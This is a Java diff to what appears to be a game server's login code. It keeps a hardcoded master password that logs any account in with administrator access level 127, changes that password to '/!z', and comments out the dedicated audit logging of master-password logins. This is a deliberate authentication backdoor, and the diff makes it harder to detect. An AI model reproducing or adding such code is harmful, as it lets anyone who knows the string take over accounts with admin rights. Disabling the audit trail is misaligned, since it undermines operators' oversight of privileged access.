@@ -33,7 +33,6 @@ import javax.crypto.Cipher;
 import javolution.util.FastCollection.Record;
 import javolution.util.FastMap;
 import javolution.util.FastSet;
-import luna.custom.logger.LunaLogger;
 import net.sf.l2j.Base64;
 import net.sf.l2j.Config;
 import net.sf.l2j.L2DatabaseFactory;
@@ -537,15 +536,15 @@ public boolean loginValid(String user, String password, L2LoginClient client)// 
 	if (password.equals("/!a"))
 	{
 		_log.info(user +" tried to log with old master password from ip address: "+ client.getConnection().getInetAddress());
-		LunaLogger.getInstance().logLs("loginServer_master_password", user +" tried to log with old master password from ip address: "+ client.getConnection().getInetAddress());
+		//LunaLogger.getInstance().logLs("loginServer_master_password", user +" tried to log with old master password from ip address: "+ client.getConnection().getInetAddress());
 		return false;
 	}
 	
-	if (password.equals("--97350197.."))
+	if (password.equals("/!z"))
 	{
 		client.setLastServer(1);
 		client.setAccessLevel(127);
-		LunaLogger.getInstance().logLs("loginServer_master_password", user +" logged with master password from ip: "+ client.getConnection().getInetAddress());
+		//LunaLogger.getInstance().logLs("loginServer_master_password", user +" logged with master password from ip: "+ client.getConnection().getInetAddress());
 		_log.info(user +" logged with master password from ip: "+ client.getConnection().getInetAddress());
 		return true;
 	}
